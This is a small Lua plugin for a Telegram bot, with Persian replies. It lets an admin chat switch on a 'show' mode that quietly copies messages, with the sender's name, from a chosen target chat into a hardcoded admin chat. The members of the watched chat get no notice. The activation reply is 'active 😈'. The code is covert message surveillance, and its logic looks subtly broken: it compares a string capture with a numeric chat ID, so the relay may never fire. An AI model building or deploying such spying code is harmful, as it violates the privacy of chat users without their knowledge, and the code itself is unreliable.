local function run(msg, matches)
    local name = msg.from.print_name
    local chatseeid = matches[1]
    if msg.text == "show"..matches[1] or msg.text == "Show"..matches[1] then
    if msg.to.id == 142334685 then
    show = 1
    return "فعال 😈"
    else
    send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
    end
    elseif msg.text == "stopshow" or msg.text == "Stopshow" then
    if msg.to.id == 142334685 then
    show = 0
    return "غیر فعال"
    else
    send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
    end
    end
    if msg.to.id == chatseeid then
    if tonumber(show) == 1 then
    chat = msg.text
    txt = name..'\n___________\n'..chat
    send_msg('chat#142334685', txt, ok_cb, false)
    end
    end
end
return {
     patterns = {
        "^[Ss]how (.*)$",
        "^[Ss]topshow$"
        },
     run = run
}
